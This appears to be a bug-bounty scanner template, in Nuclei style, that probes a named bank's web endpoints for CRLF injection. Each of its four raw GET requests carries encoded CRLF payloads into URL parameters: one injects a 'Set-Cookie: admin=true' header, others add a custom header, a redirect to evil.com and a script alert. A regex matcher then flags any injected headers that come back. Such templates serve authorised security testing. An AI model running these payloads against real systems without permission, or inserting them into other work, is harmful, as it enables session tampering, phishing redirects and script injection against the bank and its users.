id: tinkoff-crlf-injection

info:
  name: Tinkoff - CRLF Injection
  author: bugbounty
  severity: medium
  description: CRLF injection in URL parameters and headers
  tags: crlf,injection,tinkoff

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web%0d%0aSet-Cookie:%20admin=true&sessionid=test HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/common/v1/mobile_info?platform=android%0d%0aX-Injected:%20header&sessionid=test HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /cards/debit-cards/tinkoff-black/?utm_source=test%0d%0aLocation:%20https://evil.com HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /invest/stocks?utm_medium=test%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?i)(Set-Cookie|X-Injected|Location):.*'

      - type: status
        status:
          - 200
          - 302
